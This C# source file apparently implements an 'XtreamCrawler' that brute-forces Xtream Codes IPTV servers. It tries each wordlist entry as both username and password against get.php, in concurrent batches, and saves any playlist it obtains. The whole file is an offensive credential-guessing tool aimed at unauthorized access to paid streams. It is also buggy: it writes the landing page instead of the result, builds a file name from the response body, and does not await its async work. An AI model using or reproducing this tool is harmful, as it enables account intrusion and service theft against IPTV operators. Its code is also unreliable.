using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.ComponentModel;
using System.IO;

namespace IPTV_Sharp
{

    public enum CrawlerStatus
    {
        Idle,
        Working,
        InvalidSite,
        CompletedWithResults,
        CompletedWithoutResults,
        Aborted
    }

    public class XtreamCrawler
    {
        private DictionaryManager dictionary;
        private HttpClient client;
        private string server;
        private int concurrent_tasks;

        public int progress;
        public CrawlerStatus status;
        
                      
        public XtreamCrawler(DictionaryManager dictionary, string server, int concurrent_tasks)
        {
            this.dictionary = dictionary;
            this.server = server;
            client = new HttpClient();
            status = CrawlerStatus.Idle;
            this.concurrent_tasks = concurrent_tasks; 
        }


        public void DoCrawl(object sender, DoWorkEventArgs e)
        {
            status = CrawlerStatus.Working;
            Crawl_Method();
        }


        private async Task Crawl_Method()
        {
            string output_result = string.Empty;
            bool found_result = false;
            progress = 0;

            try
            {
                string page = await client.GetStringAsync(server);

                if (page != "" && page.Contains("Xtream Codes") && dictionary.entries.Count > 0)
                {                  

                    while (progress < dictionary.entries.Count)
                    {
                        int increment;
                        if ((progress + concurrent_tasks) < dictionary.entries.Count)
                        {
                            increment = concurrent_tasks;
                        }
                        else
                        {
                            increment = dictionary.entries.Count - progress;
                        }

                        Task<string>[] crawl_tasks = new Task<string>[increment];

                        for (int j = 0; j < crawl_tasks.Length; j++)
                        {
                            int x = progress + j;
                            crawl_tasks[j] = client.GetStringAsync(server + "/get.php?username=" + dictionary.entries[x] + "&password=" + dictionary.entries[x] + "&type=m3u&output=mpegts");
                        }

                        Task.WaitAll(crawl_tasks);

                        foreach (Task<string> crawl_task in crawl_tasks)
                        {
                            if (crawl_task.IsCompleted && crawl_task.Result != "")
                            {
                                output_result = crawl_task.Result;
                                found_result = true;
                                break;
                            }
                        }

                        if (found_result) break;

                        progress += increment;
                    }
                    
                    if(found_result)
                    {
                        if (!Directory.Exists("output")) Directory.CreateDirectory("output");
                        string output = "output/tv_channels_" + output_result + ".m3u";
                        StreamWriter outputFile = new StreamWriter(output, true);
                        outputFile.WriteLine(page);
                        outputFile.Flush();
                        outputFile.Close();
                        outputFile.Dispose();
                        progress = dictionary.entries.Count;
                        status = CrawlerStatus.CompletedWithResults;    
                    }
                    else
                    {
                        progress = dictionary.entries.Count;
                        status = CrawlerStatus.CompletedWithoutResults;
                    }
                }
                else
                {
                    status = CrawlerStatus.InvalidSite;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                status = CrawlerStatus.Aborted;
            }
        }




    }
}
